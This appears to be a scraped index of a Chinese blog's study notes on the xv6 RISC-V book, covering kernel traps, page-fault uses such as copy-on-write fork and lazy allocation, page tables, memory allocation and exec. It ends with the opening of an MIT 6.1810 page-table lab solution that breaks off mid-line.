(kernel/vm.c:403)从用户页表 pagetable 的虚拟地址 srcva 复制最多 max 个字节到dst。由于 pagetable 已经并非当前的页表了，所以会调用 walkaddr()（这会调用 walk()）去寻找 pagetable 的 srcva，然后就会返回一个pa0。内核页表的物理地址和虚拟地址是直接映射的，所以 copyinstr()可以直接从 pa0 复制字符串到 dst 上。walkaddr() (kernel/vm.c:109)会检测用户提供的虚拟地址是否是进程的用户地址空间的一部分以防止程序欺骗 kernel 读取其他内存。copyout() 提供了类似的功能 —— 复制用户指定的地址到内存中。 ","date":"2023-03-26","objectID":"/posts/xv6_book_chapter_4/:4:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Traps and system calls","uri":"/posts/xv6_book_chapter_4/"},{"categories":["刷课笔记"],"content":"来自内核态的 trap Xv6 控制 CPU trap 寄存器的方式会取决于当前执行的用户代码还是内核代码。如果是内核代码正在执行的话，CPU 会将 stvec 寄存器指向 kernelvec (kernel/kernelvec.S:12)处的汇编代码，这是因为 xv6 已经在内核中了，kernelvec 可以依赖 satp 设置内核页表以及指向一个有效的内核栈的栈指针。kernelvec 将 32 个寄存器全部压栈以便于后续的恢复。 kernelvec 将寄存器保存在被中断的内核线程的堆栈上。这里面有一点极其重要 —— CPU 是否会切换到其他线程，如果切换到了新进程，trap 将返回到新进程的栈，将被中断线程保存的寄存器安全地保留在新的栈上。 kernelvec 保存完寄存器后就跳转到了 kerneltrap (kernel/trap.c:135)。kerneltrap 是为设备终端和异常这两种trap做准备的。它会调用 devintr (kernel/trap.c:178)检查并处理前者。如果陷阱不是设备中断，那么它一定是异常，如果发生在 xv6 kernel 中，则始终是致命错误，kernel 调用 panic 并停止执行。 如果 kerneltrap 是被时钟中断调起来的，并且一个进程的内核线程正在运行（这与调度线程相对），kerneltrap 会调用 yield 去给其他进程执行的机会。当其中一个线程决定让出控制时，原始线程及其关联的 kerneltrap 就有机会继续执行。 当 kerneltrap 的工作结束了就会返回到被这个 trap 中断的代码上。因为 yield 可能会扰乱 sepc 和 sstatus 保存的之前的模式。 kerneltrap 再一开始就保存了它们，现在恢复控制寄存器并返回到 kernelvec (kernel/kernelvec.S:50)。kernelvec 会pop掉栈上之前保存的寄存器数据并执行 sret，将 sepc 复制给PC并恢复中断的内核代码。 当CPU从用户态进入内核态时，Xv6 将 CPU 的 stvec 设置为 kernelvec，可以再 usertrap(kernel/trap.c:29)看到这一点。 kernel 有一个窗口期用于执行，但此时 stvec 仍设置为 uservec，再此时期不能发生中断（这点很重要）幸运的是，RISC-V 在开始捕获陷阱时总是禁用中断，并且 xv6 在设置 stvec 之前不会再次启用它们。 ","date":"2023-03-26","objectID":"/posts/xv6_book_chapter_4/:5:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Traps and system calls","uri":"/posts/xv6_book_chapter_4/"},{"categories":["刷课笔记"],"content":"Page-fault exceptions Xv6对异常的响应相当无聊：如果是发生在用户态的异常，kernel 会 kill 出错的进程；如果是内核态的异常，会 kernel panic。事实上，操作系统通常会以更有趣的方式做出响应。 例如，很多kernel会使用page fault来实现 copy-on-write(COW) fork。至于 COW fork 到底是什么，可以联想 xv6 的 fork，fork 导致那时候的父进程和子进程的内存是一致的，xv6 用 uvmcopy(kernel/vm.c:306)实现了 fork，这个函数会给子进程分配物理内存并把父进程的内存复制进去。如果父进程和子进程共享父进程的物理内存将会更加高效，然而不可以直接这么实现，这样对共享的堆栈的写入会扰乱彼此的执行。 通过使用合适的页表权限和 page fault，父进程和子进程可以安全地共享物理内存。当一个没有被映射的虚拟地址要被使用的时候，CPU会报 page-fault 异常（当然如果这个页的PTE_Vflag被清除了，或其权限位(PTE_R, PTE_W, PTE_X, PTE_U)禁止尝试该操作。以上三种原因分别为 load page faults（load指令无法翻译它的虚拟地址），store page faults（store指令无法翻译它的虚拟地址）和 instruction page faults（PC指向的地址无法被翻译）。scause 寄存器会指明页错误的类型，stval 寄存器包含无法被翻译的地址。 COW fork 的基本方案就是这种父子进程初始化所有共享的物理页面，但是每个映射的页面都是只读的（PTE_W flag被清除了）。父子进程可以读取这共享的物理页面。如果有页面需要被写入，RISC-V CPU 会报一个页错误异常，kernel 的 trap 处理器会将分配一个新的物理内存页复制到报错的那个映射的物理地址。kernel 会改变报错进程页表的 PTE 以指向副本，这是可读写的。之后恢复到报错进程的那个导致报错的指令。写时复制需要一些记录来帮助确定何时可以释放物理页面，因为每个页面的引用次数可能会根据 forks、page faults、execs 和 exits 的历史而变化，取决于它的使用情况。如果一个进程发生了存储页面错误，并且物理页面只被该进程的页表引用，那么无需进行拷贝。 写时复制让 fork 更快（fork 不需要复制内存了，其中一部分后续可能会被写入，那时候才会复制）。但通常情况下，大多数内存不会被复制。一个常见的例子就是 fork 后面的 exec：一些页会在 fork 后被写入，但是子进程的 exec 会释放大多数来自父进程的内存。 页表和页错误的组合还带来了广泛有趣的可能性（除了 COW fork）。另一个广泛应用的特性被叫做 lazy allocation。这分为两部：第一步，当应用通过调用 sbrk 获取更多的内存时，kernel 记住增加的大小但不分配物理内存，也不为新的虚拟内存创建一个 PTEs；第二步，在这些新的地址中发生了页错误的时候，kernel 分配一页物理内存并将其映射进页表里。类似于 COW fork，kernel 可以在应用无法感知的情况下实现 lazy allocation 因为应用通常请求比它们实际会用到的要多的内存，lazy alloaction 让 kernel 在应用不使用这个页的话就不分配。除此之外，如果应用请求增加的地址太大，sbrk 不使用 lazy allocation 就会产生更大的消耗。Lazy allocation 使这种操作的成本可以随时间而分摊。一方面，lazy allocation 导致了处理页错误的额外开销，这会涉及到 kernel/user 转换。操作系统可以通过在每次页面错误时分配一批连续的页而不是一个页，并通过定制内核的 entry/exit 代码以处理这种页面错误，从而降低这种成本。 另一个广泛使用的 feature 是 demand paging。在 exec 中，xv6 会急切地将一个程序的所有 text 和 data 都加载到内存里。因为应用可能很大，并且从硬盘读数据是 expensive 的操作。启动应用的成本也许会被用户感知到，比如从 shell 中运行一个很大的程序，用户需要等一段时间才能得到结果。为了改善响应时间，现代化的 kernel 会给用户地址空间创建一个页表，但是标记为不可用。当页错误时，kernel 从硬盘读取一页大小的内容并且将它映射到用户地址空间中。类似 COW fork 和 lazy allocation，kernel 实现这个功能但不会被应用感知到。 程序的运行可能需要的内存比运行它的计算机实际的内存还要多，操作系统通过实现 paging to disk 以优雅地应对这个情况。这个想法就是存储一小部分的用户页表在 RAM 中，并且把剩下的存储在硬盘的 paging area 上。kernel 会将存储在 paging area 的那部分内存对应的 PTEs 标记为不可用（毕竟不在 RAM 里）。如果应用尝试读取已经从磁盘 paged out 的页，应用将会因此一个页错误，并且这个页就会 paged in：kernel trap 处理程序将会分配一个页给物理内存，从磁盘读取一页到 RAM 里，并且将相关的 PTE 修改成指向这个 RAM。 如果有一个页需要被载入内存，但是物理 RAM 已经不够了会发生什么？这种情况下，kernel 必须首先 free 一个物理页（直接 page out 或者把它搞到磁盘的 paging area 中）并将其标记为不可用。刚刚介绍的两种办法中，后者更加 expensive，所以它尽量少的出现才会是性能最佳的，即如果应用程序仅使用其内存页面的子集，且这些子集的并集适应于 RAM。这通常被称为具有良好的引用局部性。与很多虚拟内存技术一样，kernel 通常实现这个 paging to disk 不会被应用感知到。 不管硬件 RAM 有多大，计算机通常操作尽量少的物理内存。例如，云服务提供商在一台计算机上同时运行多个客户以低成本地利用他们的硬件成本。另一个例子是，人们使用一个很少物理内存的智能手机去运行很多应用。 Lazy allocation 和 damand paging 在物理内存稀缺的时候都是格外有用的。在 sbrk 或exec 中急切地分配内存会带来额外的清除成本，以便释放内存。此外，存在急切分配工作被浪费的风险，因为在应用程序使用页面之前，操作系统可能已经将其清除。 其他结合了分页和页面错误异常的特性包括自动扩展堆栈和内存映射文件。 ","date":"2023-03-26","objectID":"/posts/xv6_book_chapter_4/:6:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Traps and system calls","uri":"/posts/xv6_book_chapter_4/"},{"categories":["刷课笔记"],"content":"Real world Trampoline 和 trapframe 可能看起来过于复杂。推动力在于 RISC-V 在遇到 trap 时故意尽可能地执行少量操作，以允许非常快速的trap处理，这被证明是重要的。因此，内核 trap 处理程序的前几条指令实际上必须在用户环境中执行：用户页表和用户寄存器内容。而且 trap 处理程序最初对一些有用的事实一无所知，比如运行的进程的身份或内核页表的地址。解决方案是可能的，因为 RISC-V 提供了内核在进入用户空间之前可以存储信息的受保护位置：sscratch 寄存器和用户页表条目，它们指向内核内存，但由于缺乏 PTE_U 权限而受保护。Xv6 的 trampoline 和 trapframe 利用了这些 RISC-V 特性。 如果将内核内存映射到每个进程的用户页表中（带有适当的PTE权限标志），就可以消除特殊 trampoline 的需求。这也将消除当遇到 trap 的时候从用户空间到内核时的页表切换的需要。这反过来将允许内核中的系统调用实现利用当前进程的用户内存映射，从而允许内核代码直接引用用户指针。许多操作系统已经利用这些思想以提高效率。Xv6 避免使用它们，以降低内核由于无意中使用用户指针而导致安全漏洞的可能性，并减少确保用户和内核虚拟地址不重叠所需的一些复杂性。 生产环境下的操作系统实现 COW fork、lazy allocation、damand paging、paging to disk、memory-mapped files 等。此外，这种操作系统将尝试使用所有物理内存，用于应用程序或缓存（例如文件系统的缓冲区缓存，将在第 8.2 节中详细介绍）。在这方面，Xv6 是天真的：你希望你的操作系统使用你承受的物理内存，但 Xv6 不会这样做。此外，如果 Xv6 内存不足，它会向正在运行的应用程序返回错误或终止它，而不是例如将另一个应用程序的页面 page 到磁盘里。 ","date":"2023-03-26","objectID":"/posts/xv6_book_chapter_4/:7:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Traps and system calls","uri":"/posts/xv6_book_chapter_4/"},{"categories":["刷课笔记"],"content":"Xv6 book 的第三章节","date":"2023-03-18","objectID":"/posts/xv6_book_chapter_3/","tags":["Xv6_RISC-V"],"title":"Xv6 book: Page tables","uri":"/posts/xv6_book_chapter_3/"},{"categories":["刷课笔记"],"content":"Xv6 book 的第三章节 Page tables 操作系统通过页表给每个进程自己的私有地址空间和内存。Xv6 依此可以隔离不同的进程地址空间并在单个物理内存上重复使用。页表这种设计因在一定程度上允许操作系统可以整活而流行。Xv6 中就利用页表整了一些活： 在几个地址空间映射相同的内存（trampoline page） 使用一个未映射的页去保护内核和用户栈 ","date":"2023-03-18","objectID":"/posts/xv6_book_chapter_3/:0:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Page tables","uri":"/posts/xv6_book_chapter_3/"},{"categories":["刷课笔记"],"content":"页表硬件 RISC-V 指令操控虚拟地址，机器的RAM或物理内存由物理地址来索引。RISC-V 页表硬件可以将虚拟地址映射到物理地址。 Xv6 运行在 Sv39 RISC-V 上，也就是说它只使用 64 bit 虚拟地址的低 39 bit。在 Sv39 配置中，RISC-V 页表逻辑上包含 $2^{27} = 134,217,728$ 个 page table entries (PTE)。每个 PTE 包含一个 44 bit 的 physical page number (PPN)和一些 flag。页表硬件通过使用 39 位的高 27 位翻译成虚拟地址索引到页表中去寻找一个 PTE，并且生成一个 56 bit的物理地址（其中顶部 44 bit 来自 PTE 的 PPN，底部 12 bit 复制于原始虚拟地址。页表使得操作系统能够以 $4096 = 2^{12}$ 字节为一个块对虚拟地址到物理地址的转换进行控制，这个块被称为页。 在 Sv39 RISC-V 中，虚拟地址的高 25 bit 不必转换。物理地址还有增长空间：PTE 格式有空间让物理页面的数量增加 10 bit。RISC-V 设计者根据预测技术选择了这些数字，$2^{39}$ 就是 512 GB 作为软件足够的地址空间。在不久的将来，$2^{56}$ 是容纳许多的 I/O 设备和 DRAM 芯片的物理内存空间。如果需要更多，RISC-V 设计者已经定义了使用 48 bit 虚拟地址对 Sv48 RISC-V CPU 通过三步将虚拟地址翻译成物理地址，一个页表作为三级的树被存储在物理内存。这个树的根是一个 4096 字节的包含 512 个 PTE 的页表页，这些 PTE 包含下一级页表的物理地址。分页硬件使用 27 bit 中高 9 bit 在页表页对根部选择一个 PTE，中间 9 比特在下一级选择一个 PTE，底部 9 比特选择最后的 PTE (Sv48 RISC-V 中的页表有四级，使用虚拟地址对的 39 bit 到 47 bit 索引到顶级)。 如果转换地址的三个 PTE 中的任何一个不存在，分页硬件将引发 page-fault exception，将异常留给内核处理。 比起上边展示一级结构，三级的结构提供了一种记录 PTE 的高效存储方式。在大范围的虚拟地址没有映射这样的常见情况下，三级结构可以忽略整个页面目录。例如，如果一个程序只使用从地址 0 开始的几个页面，顶级目录的 1～511 就不需要管了，内核不必为它们的下一级分配页目录了。 虽然 CPU 执行加载或存储指令时会使用三级结构，但三级结构也存在一个潜在的缺点 —— CPU 必须从内存中加载三个 PTE 才能将虚拟地址转换成物理地址。为了减少成本，RISC-V CPU 在 Translation Look-aside Buffer (TLB)缓存 PTE，TLB 存储了虚拟地址和其对应的物理地址，如果切换了应用程序，操作系统会告诉硬件切换了 page table，处理器就会清空TLB，在 RISC-V 中，清空 TLB 的指令是 sfence_vma。 每个 PTE 都包含一个用来告诉分页硬件如何使用相应的虚拟地址的 flag。 PTE_V表明PTE是否存在，如果没有设置还要对页引用的话就会导致异常。 PTE_R表明读权限。 PTE_W表明写权限。 PTE_X表明执行权限。 PTE_U表明其是否允许user模式下的指令访问页，没设置就只能在supervisor模式下使用 flag 和其他有关页的结构都在 kernel/riscv.h 中定义。 为了告诉 CPU 使用页表，内核必须将根页表页的物理地址写入 satp 寄存器。CPU 将翻译使用自己的 satp 寄存器指向的页表的指令的所有地址。每个CPU都有自己的 satp，因此不同的 CPU 都可以运行不同的进程，每个进程都有自己的页表描述的私有地址空间。在应用程序切换时，操作系统需要把 satp 寄存器的内容更改。 通常内核将所有物理内存映射到它的页表中，以便于其能够使用指令读写物理内存中的任何位置。由于页目录位于物理内存中，内核可以通过使用标准存储指令将 PTE 的虚拟地址写入页目录中，从而操作 PTE 的内容。 关于一些名词的解释： 物理内存指 DRAM 中的存储单元。物理内存的一个字节有一个地址，称为物理地址。指令只使用虚拟地址，分页硬件将虚拟地址转换成物理地址，然后将其发送给 DRAM 硬件进行读写。与物理内存和虚拟地址不同，虚拟内存不是物理对象，而是指内核提供的用于管理物理内存和虚拟地址的抽象和机制的集合。 ","date":"2023-03-18","objectID":"/posts/xv6_book_chapter_3/:1:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Page tables","uri":"/posts/xv6_book_chapter_3/"},{"categories":["刷课笔记"],"content":"内核地址空间 Xv6 为每个进程维护一个页表，描述每个进程的用户地址空间，外加一个描述内核地址空间的页表。内核对其地址空间的布局进行配置，使其能够可预测的虚拟地址上访问物理内存和各种硬件资源。下图显示了这种布局如何将虚拟地址映射到物理地址。kernel/memlayout.h 声明了 xv6 内核内存布局的常量 QEMU 模拟一台包含 RAM（物理内存）的计算机，该机器从物理地址 0x80000000 开始，至少一直持续到 0x88000000，xv6 称之为 PHYSTOP。QEMU 模拟了 I/O 设备（例如磁盘设备）。QEMU 还将设备接口在物理地址空间中位于 0x80000000 下面作为 memory-mapped control 寄存器向软件公开。内核通过读写这些特殊的物理地址与设备交互，这种读写与设备硬件通信而不是与RAM通信。 内核使用 direct mapping 获取 RAM 和 memory-mapped device 寄存器，也就是说，映射资源到虚拟地址和物理地址是一样的。例如，内核本身在物理内存和虚拟地址的位置都是 KERNBASE = 0x80000000 中。Direct mapping 简化了读写物理内存的内核代码。例如 fork 为子进程分配用户内存的时候，分配器返回父进程内存的物理地址，当 fork 将父进程的用户内存复制到子进程时，它直接使用该地址作为虚拟地址。 以下内核虚拟地址没有 direct mapped： trampoline页: 它映射在虚拟地址空间的顶部，用户页表有同样的映射。这里可以看到，一个包含 trampoline 代码的物理页在内核的虚拟地址空间中映射了两次：一次在虚拟地址空间的顶部，一次 direct mapping。 Guard page: Guard page 的 PTE 无效（PTE_V 未设置），因此如果内核溢出内核栈就将内核栈页，每个进程都有自己的内核栈，它被映射在高位以便于 xv6 在下面保留一个未映射的 guard 导致异常并且内核 panic。如果没有 guard page，栈溢出将覆盖其他内核内存。 虽然内核通过高位内存映射使用它的栈，但它也可以通过 direct mapping 访问内核。另一种备用设计只有 direct mapping 并在 direct mapping 的地址使用栈。这种情况下，提供 guard page 将涉及取消虚拟地址，否则这些虚拟地址将引用物理内存。 内核使用权限 PTE_R 和 PTE_X 映射 trampoline 和 kernel。内核从这些页中读并执行指令。内核使用 PTE_W 和 PTE_R 权限映射其他页，这样它可以读写这些页的内存。Guard page 的映射无效。 ","date":"2023-03-18","objectID":"/posts/xv6_book_chapter_3/:2:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Page tables","uri":"/posts/xv6_book_chapter_3/"},{"categories":["刷课笔记"],"content":"代码：创建地址空间 用于操作进程地址空间和页表的大多数 xv6 代码都在 vm.c (kernel/vm.c)里。主要的数据结构是一个指向 RISC-V 根页表页的指针 pagetable_t。pagetable_t 可以是内核页表或者任何进程的页表中的一个。其主要函数是 walk，它寻找虚拟地址的 PTE 和通过映射安装 PTE 的 mappages。以 kvm 开头的函数操作内核页表，以 uvm 开头的函数操作用户页表。copyout 和 copyin 复制数据和被提供的用户虚拟地址作为系统调用参数，它们在 vm.c 以便于明确地翻译到对应的物理内存。 在启动顺序中，main 调用 kvminit (kernel/vm.c)去使用 kvmmake (kernel/vm.c)创建一个内核页表。这个调用发生在 xv6 在 RISC-V 启用分页之前，所以直接引用物理内存的地址。kvmmake 首先分配一个物理内存页去保留根页表页，然后它会调用 kvmmap 去安装内核所需要的 translations，这个 translations 包含内核的代码和数据，取决于 PHYSTOP 的物理内存，以及设备实际的内存区域。proc_mapstacks (kernel/proc.c)为每个进程分配一个内核桟。它调用 kvmmap 为每个桟映射生成的由 KSTACK 产生的虚拟地址，这会为桟的 guard page 预留空间。 kvmmap (kernel/vm.c) 调用 mappages (kernel/vm.c)给一系列的虚拟地址映射到相应的物理地址。这会把每个虚拟地址都以页隔开。对于每个要映射的虚拟地址来说，mappages 调用 walk 去找到相应的 PTE 的地址，然后初始化这个 PTE 以存放相应的PPN并赋以权限，再设置 PTE_V 以表明其有效。 walk (kernel/vm.c)模拟 RISC-V 分页硬件，因为它在 PTE 中查找虚拟地址。walk 将三级页表 descend 9 bit，它使用虚拟地址每一级的 9 bit 去找到下一级的 PTE。如果 PTE 是无效的，那么所需的页就没被分配，如果 alloc 参数被设置好了，walk 分配一个新的页表页并把物理地址放到 PTE，它将返回这个 PTE 在三级树中最低一层的地址。 上面的代码依赖于内存被 direct-mapped 到内存的虚拟地址空间。例如，当 walk desend 页表 level 时，它会从 PTE 拿出下一级页表的物理地址 (kernel/vm.c)，并且之后就使用这个地址作为获取下一级 PTE 的虚拟地址。 每个 RISC-V CPU 在 TLB (Translation Look-aside Buffer)缓存 PTE，xv6 必须在改变一个页表时告诉 CPU 使相应已缓存的 TLB 失效。RISC-V 有 sfence.vma 指令去重置当前 CPU 的 TLB。重加载 satp 寄存器之后，xv6 会在 kvminithart 执行 sfence.vma，并在 trampoline 代码中在返回到用户空间之前切换到用户页表 (kernel/trampoline)。 在改变 satp 寄存器之前还需要 issue sfence.vma 代码以等待 load 和 store 的完成。这个等待可以确保进程使用的页表是更新完成。 为了避免 TLB 被完全重置，RISC-V CPU 支持地址空间标记 (ASIDs, Address Space Identifiers)，这样内核就可以重置特定的 TLB 条目，xv6 不支持该功能。 ","date":"2023-03-18","objectID":"/posts/xv6_book_chapter_3/:3:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Page tables","uri":"/posts/xv6_book_chapter_3/"},{"categories":["刷课笔记"],"content":"物理内存分配 Xv6 在内核结尾和 PHYSTOP 之间的物理内存进行运行时的分配。一次分配和释放都是整个 4096 字节的页。这会通过页表本身的链表去跟踪那个页表是 free 的。分配就是把页表从链表中删除，释放就是把页表添加进去。 ","date":"2023-03-18","objectID":"/posts/xv6_book_chapter_3/:4:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Page tables","uri":"/posts/xv6_book_chapter_3/"},{"categories":["刷课笔记"],"content":"代码：物理内存分配器 这个分配器在 kalloc.c (kernel/kalloc.c)。分配器的数据结构是一个用来给可分配的物理内存页分配的 free 列表。每个 free 列表的元素都是一个 struct run (kernel/kcalloc)。分配器保存该数据结构的内存区域就是这个 free 页本身，因为这里没被用来存储东西。这个 free 列表被一个 spin 锁保护。列表和锁被封装在一个结构体中以明确结构体中锁保护的内容。这里忽略 acquire 和 release 的调用，第六节将会介绍锁的细节。 main 函数调用 kinit 去初始化分配器 (kernel/kalloc)。kinit 初始化 free 列表去保存内核末尾和 PHYSTOP 中间的每一个页。Xv6 应该解析硬件提供的配置信息来确定多少物理内存是可用的。如果不是的话，xv6 就假定该机器有 128 MB 的 RAM。kinit 调用 freerange 通过每个页调用 kfree 添加内存到 free 列表。因为 PTE 只能引用 4096 字节对齐的物理地址（4096 字节的倍数），所以 freerange 使用 PGROUNDUP 确保它只释放对齐的物理地址。分配器没有内存，这些对 kfree 的调用会给它一些内存。 分配器在要做算数运算时将地址视作整数（比如要在 freerange 里遍历所有页），读写内存时看作数组（比如在操作每个页的 run 结构）。对地址的这两种使用方式是分配器代码充斥 C 类型转换的主要原因，另一个原因就是分配和释放实际上是改变了内存的类型 kfree 函数 (kernel/kalloc.c)首先将要释放的内存的每一个字节赋 1。这将导致代码在释放内存后使用内存（使用 dangling reference）去读 garbage 而不是旧的有效内容，希望这会导致此类代码更快地崩溃。然后 kfree 将页加到 free 列表中，它将 pa 转换成 struct run，记录在 r-\u003enext 中 free 列表的 old start，将列表设为 r.kalloc 删除并返回的 free 列表的第一元素。 ","date":"2023-03-18","objectID":"/posts/xv6_book_chapter_3/:5:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Page tables","uri":"/posts/xv6_book_chapter_3/"},{"categories":["刷课笔记"],"content":"进程地址空间 每个进程都被分配一个页表。当 xv6 在进程之间切换时，其页表也会发生变化。下图展示了进程地址空间的更多细节。一个进程的用户内存开始与虚拟内存 0 的位置并可以增长到 MAXVA (kernel/riscv.h)，理论上允许进程处理 256 GB 的内存。进程地址空间页的页的内容包括程序的一些内容（xv6 使用 PTE_R、PTE_X、PTE_U 权限映射）。页包括程序每个已初始化的数据，一个桟的页和一个堆的页，xv6 使用 PTE_R、PTE_X、PTE_U 权限来映射数据和堆栈。 桟就一个页，为 exec 初始化内容。包括命令行参数的字符串以及指向它们的指针数组都在桟顶，紧接着就是允许程序在 main 函数启动的值，就像程序 main(argc, argv) 被调用了一样。 Xv6 在桟的下方整了一个不可访问（通过清除了 PTE_U 实现）的 guard 页来检测被分配的桟内存的桟溢出。如果用户桟溢出并且该进程尝试使用桟下方的地址，硬件就会产生 page-fault 异常。现实世界的操作系统可能会为进程用户栈分配更多的内存。 进程若要向 xv6 申请更多的用户内存，xv6 会增长进程的堆。Xv6 首先使用 kalloc 分配物理页，然后将PTE添加到进程的指向新的物理页的页表里。Xv6 为这些 PTEs 设置PTE_W、PTE_R、PTE_U 和 PTE_V。大多数进程不会使用整个用户地址空间，xv6 会清除未使用的 PTEs 的 PTE_V。 不同进程页表翻译用户内存到物理内存不同的页，这样可以给每个内存一个私有的空间。每个进程认为它的内存是从 0 开始连续下去的，事实上物理内存上可以是非连续的。内核映射带有 trampoline 代码的页到用户地址空间的顶部（没有 PTE_U)，因此一个物理页展示给所有地址空间，但是只有内核可以使用。 ","date":"2023-03-18","objectID":"/posts/xv6_book_chapter_3/:6:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Page tables","uri":"/posts/xv6_book_chapter_3/"},{"categories":["刷课笔记"],"content":"代码：sbrk sbrk 是用来改变进程内存大小的系统调用。这个系统调用被实现于 growproc 函数 (kernel/proc.c)。growproc 通过 n 是正数还是负数选择去调用 uvmalloc 或 uvmdealloc。uvmalloc (kernel/vm.c)使用 kalloc 分配物理内存，并且使用 mappages 把 PTEs 添加到用户页表中。uvmdeclloc 调用 uvmunmap (kernel/vm.c)，它会使用 walk 找到 PTEs 再使用 kfree 去释放物理内存。 Xv6 使用进程的页表不仅是告诉了硬件如何映射虚拟地址，还是分配给进程的物理页的唯一记录。这也是在释放用户内存前需要检索用户页表的原因。 ","date":"2023-03-18","objectID":"/posts/xv6_book_chapter_3/:7:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Page tables","uri":"/posts/xv6_book_chapter_3/"},{"categories":["刷课笔记"],"content":"代码：exec exec 是一个从可执行文件中读取数据去替换进程的用户空间的系统调用。exec (kernel/exec.c)使用 namei (kernel/exec,c)打开指定的二进制 path，在第 8 节文件系统中会介绍。然后它会读取 ELF header。Xv6 下的可执行文件格式是在 kernel/elf.h 下定义的 ELF 格式。ELF 包括 ELF header (struvt elfhdr (kernel/elf.h))，接着就是一系列的程序 section headers（struct proghdr (kernel/elf.h)）。每个 proghdr 描述了程序需要加载到内存的 section，xv6 程序有两个 section —— 一个指令，一个数据。 第一步是快速检查该文件是否是 ELF 二进制文件。一个 ELF 二进制文件以四字节的 magic number（0x7F、E、L、F）开头，ELF_MAGIC 定义在 (kernel/elf.h)中。 #define ELF_MAGIC 0x464C457FU // \"\\x7FELF\" in little endian exec 使用 proc_pagetable (kernel/exec.c)分配一个没有用户映射的新页表，使用 uvmalloc (kernel/exec.c)为每个 ELF segment 分配内存，使用 loadseg (kernel/exec.c)将每个 segment 加载到内存。laodseg 使用 walkaddr 找被分配内存的物理地址，并写入 ELF segment 的每个页，使用 readi 从文件中读取。 下面是使用 exec 创建的第一个进程 init： $ objdump -p user/_init user/_init: file format elf64-little Program Header: 0x70000003 off 0x0000000000007552 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**0 filesz 0x0000000000000066 memsz 0x0000000000000000 flags r-- LOAD off 0x0000000000001000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**12 filesz 0x0000000000000db0 memsz 0x0000000000000db0 flags r-x LOAD off 0x0000000000002000 vaddr 0x0000000000001000 paddr 0x0000000000001000 align 2**12 filesz 0x0000000000000010 memsz 0x0000000000000030 flags rw- STACK off 0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4 filesz 0x0000000000000000 memsz 0x0000000000000000 flags rw- 可以看到，代码被加载到内存中虚拟地址 0 的位置上；数据在地址 0x1000 上，没有执行权限。一个程序 section header 的 filesz 可能小于 memsz，表明它们之间的差距是用 0 填充（比如 C 的全局变量）而不是从文件中读取。比如这个 init，filesz 的值是 0x10，memsz 是0x30，所以 uvmalloc 分配 0x30 字节用来容纳足够的物理内存，但是只从 init 文件中读取 0x10 字节。 exec 分配并初始化了用户桟，它只分配一个桟页。exec 一次复制一个字符串参数到栈顶，在 ustack 记录指向它们的指针。它在 argv 数组传递给 main 函数时在数组后面放一个空指针。ustack 前三项是伪造的程序返回计数器、argc、argv 指针。 exec 在桟下边整了一个不可访问的页，程序一访问就报错。该页还允许 exec 处理过大的参数。exec 使用 copyout (kernel/vm.c)函数将参数复制到桟上时如果发现到了不可访问的页，就会 return -1。 在准备新的内存 image 期间，如果 exec 检测到了错误（比如程序 segment 无效）就会跳转到 bad 标签，释放新的 image 并返回 -1。exec 必须等到释放了旧的 image，直到确定系统调用成功。如果旧的 image 没了，这系统调用就无法 return -1。这是在 exec 创建 image 时发生的唯一的错误情况。一旦 image 完成了，exec 就会提交到新页表上，并且释放掉旧的。 exec 加载 ELF 中的字节到内存中 ELF 文件指定的地址。用户和进程可以将 ELF 文件放到任何地址上，因此 ELF 文件可能有意无意地引用了内核。xv6 执行了大量的检查以避免这样的风险，比如 if(ph.vaddr + ph.memsz \u003c ph.vaddr) 检查和是否溢出了 64 位整数。这个危险在于 ELF 中的 ph.vaddr 是由用户指定的地址， ph.memsz 也很大，总和可以溢出到 0x1000 这样的地址。 ","date":"2023-03-18","objectID":"/posts/xv6_book_chapter_3/:8:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Page tables","uri":"/posts/xv6_book_chapter_3/"},{"categories":["刷课笔记"],"content":"现实情况 xv6 和大多数操作系统一样使用分页硬件进程内存保护和映射。大多数操作系统会使用组合分页这样比 xv6 更复杂的分页和 page fault 异常。 xv6 通过内核在虚拟地址和物理地址的翻译中使用 direct map 得以简化。它假设物理 RAM 的 0x8000000 地址上有位置给内核加载，这在 QEMU 上没问题，但在真实的硬件上并不是什么好主意。 RISC-V 支持物理地址级别的保护，xv6 没有使用该功能。在大内存的机器上，应该使用 RISC-V 对 super pages 的支持，也可以减少对页表操作的开销。 xv6 内核缺少可以为小对象提供内存的类似 malloc 的分配器防止内核使用需要动态分配的复杂数据结构。一个更好的内核可能会分配许多不同大小的小块，而不是（比如 xv6 ）只有 4096 字节；一个真正的内核分配器需要处理不同大小的分配。 ","date":"2023-03-18","objectID":"/posts/xv6_book_chapter_3/:9:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Page tables","uri":"/posts/xv6_book_chapter_3/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第三个 lab 的 solution","date":"2023-03-16","objectID":"/posts/mit_61810_lab3/","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: page tables","uri":"/posts/mit_61810_lab3/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第三个 lab 的 solution page tables ","date":"2023-03-16","objectID":"/posts/mit_61810_lab3/:0:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: page tables","uri":"/posts/mit_61810_lab3/"},{"categories":["刷课_Lab"],"content":"Speed up system calls (easy) When each process is created, map one read-only page at USYSCALL (a virtual address defined in memlayout.h). At the start of this page, store a struct usyscall (also defined in memlayout.h), and initialize it to store the PID of the current process. For this lab, ugetpid() has been provided on the userspace side and will automatically use the USYSCALL mapping. You will receive full credit for this part of the lab if the ugetpid test case passes when running pgtbltest. 在kernel/proc.h中的proc结构体定义中新增一个变量： struct usyscall *usc; // stores Process ID to speed up getpid() syscall 在kernel/proc.c中的allocproc函数分配trapframe页的下面加上： if 